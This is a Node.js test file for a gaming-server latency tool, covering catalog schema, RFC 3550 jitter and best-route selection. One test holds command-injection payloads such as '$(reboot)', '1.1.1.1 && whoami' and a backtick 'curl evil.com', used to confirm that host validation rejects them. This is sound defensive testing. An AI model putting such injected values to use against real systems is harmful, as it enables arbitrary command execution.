import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

// Load catalog
const catalogPath = path.resolve('data/game_servers.json');

describe('Gaming Server Radar & Latency Matrix Tests', () => {
  it('data/game_servers.json exists and is valid JSON', () => {
    assert.ok(fs.existsSync(catalogPath), 'game_servers.json must exist');
    const raw = fs.readFileSync(catalogPath, 'utf8');
    const list = JSON.parse(raw);
    assert.ok(Array.isArray(list), 'catalog must be an array');
    assert.ok(list.length >= 15, `expected >= 15 server nodes, found ${list.length}`);
  });

  it('contains all 5 required competitive titles with multiple regions', () => {
    const list = JSON.parse(fs.readFileSync(catalogPath, 'utf8'));
    const games = new Set(list.map((s) => s.gameId));

    assert.ok(games.has('valorant'), 'must include Valorant');
    assert.ok(games.has('cs2'), 'must include CS2');
    assert.ok(games.has('fortnite'), 'must include Fortnite');
    assert.ok(games.has('apex'), 'must include Apex Legends');
    assert.ok(games.has('warzone'), 'must include Warzone');

    // Check regional coverage
    const regions = new Set(list.map((s) => s.regionId));
    assert.ok(regions.has('europe'), 'must cover Europe');
    assert.ok(regions.has('middle_east'), 'must cover Middle East');
    assert.ok(regions.has('north_america'), 'must cover North America');
  });

  it('validates schema integrity for all server definitions', () => {
    const list = JSON.parse(fs.readFileSync(catalogPath, 'utf8'));
    const idSet = new Set();

    for (const s of list) {
      assert.ok(s.id && typeof s.id === 'string', 'server must have id');
      assert.ok(!idSet.has(s.id), `duplicate server id: ${s.id}`);
      idSet.add(s.id);

      assert.ok(s.game && typeof s.game === 'string', 'server must have game name');
      assert.ok(s.location && typeof s.location === 'string', 'server must have location');
      assert.ok(s.host && typeof s.host === 'string', 'server must have host');
      assert.ok(typeof s.port === 'number' && s.port > 0 && s.port <= 65535, 'valid port required');
      assert.ok(typeof s.recommendedMtu === 'number' && s.recommendedMtu >= 1200, 'valid MTU required');
      assert.ok(s.provider && typeof s.provider === 'string', 'provider name required');
    }
  });

  it('strictly validates all catalog hosts against shell injection', () => {
    const HOST_REGEX = /^(?:[a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+$|^(?:\d{1,3}\.){3}\d{1,3}$|^[a-fA-F0-9:]+$/;
    function isValidTargetHost(host) {
      if (!host || typeof host !== 'string' || host.length > 253) return false;
      if (/[\s&|;<>`$'"\\!%*?^/{}[\]]/.test(host)) return false;
      return HOST_REGEX.test(host.trim());
    }

    const list = JSON.parse(fs.readFileSync(catalogPath, 'utf8'));
    for (const s of list) {
      assert.ok(isValidTargetHost(s.host), `Host failed safety validation: ${s.host}`);
    }

    // Safety checks against injection payloads
    assert.equal(isValidTargetHost('8.8.8.8; calc.exe'), false);
    assert.equal(isValidTargetHost('1.1.1.1 && whoami'), false);
    assert.equal(isValidTargetHost('`curl evil.com`'), false);
    assert.equal(isValidTargetHost('$(reboot)'), false);
    assert.equal(isValidTargetHost('127.0.0.1|powershell'), false);
    assert.equal(isValidTargetHost('192.168.1.1/24'), false);
  });

  it('accurately calculates RFC 3550 interarrival jitter', () => {
    // Formula: J_i = J_{i-1} + (|D(i-1, i)| - J_{i-1}) / 16
    let currentJitter = 0;
    let lastRtt = 40;

    const stream = [42, 45, 38, 55, 41];
    for (const rtt of stream) {
      const d = Math.abs(rtt - lastRtt);
      currentJitter = currentJitter + (d - currentJitter) / 16;
      lastRtt = rtt;
    }

    assert.ok(currentJitter > 0, 'jitter must be positive for varying RTTs');
    assert.ok(currentJitter < 15, 'jitter must be within realistic variance bounds');
  });

  it('identifies lowest RTT as Best Route per game', () => {
    const mockResults = [
      { id: 'v1', gameId: 'valorant', rtt: 65, isBestRoute: false },
      { id: 'v2', gameId: 'valorant', rtt: 38, isBestRoute: false },
      { id: 'v3', gameId: 'valorant', rtt: 120, isBestRoute: false },
      { id: 'cs1', gameId: 'cs2', rtt: 45, isBestRoute: false },
      { id: 'cs2', gameId: 'cs2', rtt: 52, isBestRoute: false },
    ];

    const groups = new Map();
    for (const r of mockResults) {
      if (!groups.has(r.gameId)) groups.set(r.gameId, []);
      groups.get(r.gameId).push(r);
    }

    for (const group of groups.values()) {
      group.sort((a, b) => a.rtt - b.rtt);
      group[0].isBestRoute = true;
    }

    assert.equal(mockResults.find((r) => r.id === 'v2').isBestRoute, true, 'v2 (38ms) must be best route for Valorant');
    assert.equal(mockResults.find((r) => r.id === 'cs1').isBestRoute, true, 'cs1 (45ms) must be best route for CS2');
    assert.equal(mockResults.find((r) => r.id === 'v1').isBestRoute, false);
  });
});
